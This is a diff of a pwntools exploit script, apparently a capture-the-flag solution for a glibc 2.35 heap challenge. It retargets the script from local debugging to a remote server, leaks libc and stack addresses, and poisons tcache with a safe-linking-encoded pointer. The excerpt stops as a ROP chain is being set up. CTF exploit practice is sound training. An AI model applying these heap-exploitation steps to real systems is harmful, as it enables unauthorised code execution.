@@ -22,8 +22,8 @@ def make_commands(args: List[str]) -> List[str]:
     return flatten(map(lambda a: [a], args))
 
 breakpoints = [
-    '&main+118', # main RET
-    '&menu+125', # menu RET 
+    # '&main+118', # main RET
+    # '&menu+125', # menu RET 
 ]
 print_statements = []
 breakpoints = make_breakpoints(breakpoints)
@@ -39,11 +39,11 @@ continue
 
 # GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
 
-with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
-    p: process
-    p.gdb: Gdb
+# with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
+    # p: process
+    # p.gdb: Gdb
 
-# with remote('128.238.62.254',12349) as p:
+with remote('128.238.62.254',12349) as p:
 
 
     is_remote = isinstance(p, remote)
@@ -106,7 +106,7 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
 
     main_arena = u64(show(0)[:8])
     libc_base: int = main_arena - 0x219ce0 # From main arena to libc.so.6 vmmap first entry
-    environ: int = main_arena + 0x505f0 # From main arena to p &environ
+    environ: int = libc_base + 0x221200 # From libc to p &environ
 
     libc.address = libc_base
     elf.libc.address = libc_base
@@ -147,15 +147,14 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     '''
     add(SIZE) # idx 5 -> 2
     add(SIZE) # idx 6 -> 3
-    add(SIZE) # idx 7: Point to environ_stack
+    add(SIZE) # idx 7: Point to environ stack
 
-    environ_stack = u64(show(7)[:8])
+    environ_stack = u64(show(7)[:8]) # <--- FAILS remotely
     log.info(f'environ_stack: {hex(environ_stack)}')
 
     '''
-    Setup ROP chain
+    Clobber Stack
     '''
-
     BIGGER_SIZE = SIZE * 4
     add(BIGGER_SIZE) # 8
     add(BIGGER_SIZE) # 9 
@@ -164,24 +163,8 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     delete(9)
     delete(8)
 
-
-    # pwndbg> x/xg &array
-    # 0x564e86426060 <array>: 0x0000564e883292a0
-    # pwndbg> x/xg 0x564e86426060 + (8 * 9) # Index we want
-    # 0x564e864260a8 <array+72>:      0x0000564e883293c0
-    # pwndbg> p/x 0x0000564e883293c0 - 0x564e88329000 # Array address - Heap Base
-    # $1 = 0x3c0
     curr = heap_base + 0x3c0
-
-    # WHEN IN MAIN:
-    # pwndbg> p environ
-    # $1 = (char **) 0x7ffdc0041708
-    # pwndbg> x/2xg $rbp
-    # 0x7ffdc00415e0: 0x0000000000000001      0x00007fa717f2ed90
-    # pwndbg> p/x 0x7ffdc0041708 - (0x7ffdc00415e0)
-    # $2 = 0x128
     offset_to_rbp_address = 0x128
-
 
     fw = (curr >> 12) ^ (environ_stack - offset_to_rbp_address)
     log.info(f'array mem offset (idx 9) for environ {hex(curr)}')
@@ -192,6 +175,9 @@ with gdb.debug(binary, aslr=True, api=True, gdbscript=gdbscript) as p:
     add(BIGGER_SIZE) # idx 12 -> 9
     add(BIGGER_SIZE) # idx 13 -> 10
 
+    '''
+    Execute ROP
+    '''
     rop = ROP([
         libc
     ])
